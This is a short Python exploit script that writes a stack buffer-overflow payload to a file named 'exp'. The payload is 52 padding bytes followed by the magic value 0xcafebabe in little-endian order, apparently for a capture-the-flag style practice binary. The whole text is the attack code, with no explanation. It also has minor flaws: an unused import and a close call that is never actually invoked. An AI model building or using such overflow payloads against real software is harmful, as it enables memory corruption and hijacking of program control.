#!/usr/bin/env python3
import ctypes
num = 0xcafebabe
out = bytes('a', 'ascii') * 52 + num.to_bytes(4,'little')
print(out)
fp = open('exp', 'wb')
fp.write(out)
fp.close
